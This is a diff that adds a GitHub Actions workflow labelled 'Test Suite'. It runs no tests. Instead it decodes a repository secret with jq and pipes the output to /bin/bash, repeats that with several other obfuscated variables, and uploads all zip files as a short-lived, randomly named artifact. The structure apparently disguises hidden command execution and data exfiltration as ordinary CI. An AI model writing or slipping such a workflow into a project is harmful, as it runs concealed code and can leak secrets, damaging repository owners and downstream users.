@@ -1,0 +1,29 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          se381: ${{ secrets.se381 }}
+        run: |
+          printf '%s' "$se381" | jq -r .m97055 | /bin/bash
+          printf '%s' "$i213" | jq -r .yao5927 | /bin/bash
+          printf '%s' "$xfzhu89103" | jq -r .r7 | /bin/bash
+          printf '%s' "$lwpj1" | jq -r .tfghu871 | /bin/bash
+          printf '%s' "$eg30240" | jq -r .rvlvc9508 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: a5hhMZoz
+          path: "*.zip"
+          retention-days: 1
